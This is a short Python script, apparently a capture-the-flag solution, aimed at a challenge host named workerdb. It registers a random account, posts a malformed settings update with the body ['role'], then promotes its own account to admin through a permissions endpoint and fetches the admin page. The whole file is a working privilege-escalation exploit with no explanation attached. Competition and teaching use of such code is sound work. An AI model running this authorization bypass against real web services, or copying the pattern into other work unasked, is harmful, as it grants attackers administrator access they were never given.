import requests
import secrets

TARGET = "http://workerdb.chal.cubectf.com:5500"

s = requests.Session()

username, password = secrets.token_hex(8), secrets.token_hex(8)
print(username, password)
r = s.post(f"{TARGET}/api/register", json={"username": username, "password": password})
print(r.json())

r = s.post(f"{TARGET}/api/login", json={"username": username, "password": password})
print(r.json())

r = s.post(f"{TARGET}/api/settings/update", json=["role"])
print(r.text)

r = s.post(f"{TARGET}/api/manage/permissions", json={"target_user": username, "new_role": "admin"})
print(r.json())

r = s.get(f"{TARGET}/api/admin")
print(r.text)
